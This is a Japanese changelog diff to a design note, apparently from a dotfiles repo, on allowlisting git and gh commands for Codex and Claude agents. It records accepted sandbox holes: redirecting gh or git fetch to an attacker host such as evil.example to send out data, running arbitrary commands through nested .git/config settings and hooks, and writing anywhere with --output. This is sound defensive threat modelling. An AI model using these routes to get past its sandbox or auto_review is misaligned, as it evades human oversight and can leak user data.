@@ -22,7 +22,7 @@ Codex の auto_review と Claude の確認で止まる回数を減らすため�
 - Codex では allow に当たったコマンドは review なしで sandbox の外で走る。#325 では、次の穴を理由に git / gh を入れなかった。ユーザーと相談し、受け入れることにした。どれも回りくどい手順（読んだ値を URL に組み込む、入れ子のリポジトリと設定を作るなど）を踏む必要があり、その途中のどこかで auto_review が止めるという見込み込みで受け入れる
   1. 引数で送り先を変えられる（`gh pr list -R evil.example/...`・`gh pr view <URL>`・`git fetch <URL>`）。読んだ値を URL に載せて送れる
   2. 入れ子のリポジトリの `.git/config`（`core.fsmonitor`・`diff.external` など）と `workdir` の組み合わせで、git から任意のコマンドを実行できる。`git fetch origin` などは ref を書き換えるので `reference-transaction` フックも走り、origin を手元のパスに向ければ `--upload-pack` も走る
-  3. `git diff --output=<path>` などで任意の場所に書き込める
+  3. `git diff` / `git log` / `git show` の `--output=<path>` で任意の場所に書き込める
 - `prefix_rule` は決まった位置の引数にしか当たらず、`--repo=x` のような `=` つきの形にも当たらない。`prompt` は穴を塞ぐものではなく、よくある形を review に回すだけのもの
 - Codex の rules のファイルは `read-only.rules` から `allowed.rules` に名前を変えた。読み取り系だけではなくなったため
 - Codex の rules は、複数のルールに当たったとき一番厳しい判定になる（`codex execpolicy check` で確かめた）
@@ -32,7 +32,7 @@ Codex の auto_review と Claude の確認で止まる回数を減らすため�
 - [x] `devenv shell lint-all` が通る
 - [x] Pro・Air の darwin 設定がビルドでき、生成された Claude の `settings.json` と Codex の rules に共通リストが入っている
 - [x] `codex execpolicy check` で、`git fetch origin` / `gh pr list` は allow、`gh pr list -R x/y` は prompt、`git fetch --upload-pa=x .` / `git push` / `gh pr create` はマッチしない
-- [ ] レビューを取り込み CI が通った PR → <URL>
+- [x] レビューを取り込み CI が通った PR → https://github.com/mizunashi-mana/dotfiles/pull/326
 
 ## 作業ログ
 
@@ -45,3 +45,6 @@ Codex の auto_review と Claude の確認で止まる回数を減らすため�
   - Info 2（`rg` / `file` などを入れない理由が消えた）: README に書いた
   - Info 3（`sleep` / `gh run watch` が「止まらない」と食い違う）: 基本チェックを「止めない限り終わらないものではない」と書き直した
   - Info 4（`reference-transaction` フック）: 受け入れたリスク 2 に書き足した
+- 2026-10-23: 2 回目のレビューは Critical 0 / Warning 0 / Info 2
+  - Info 1（`--output` は `git log` / `git show` でも効く）: 共通リストのコメントと README に書いた
+  - Info 2（`git rebase --continue` の並び順）: 直した
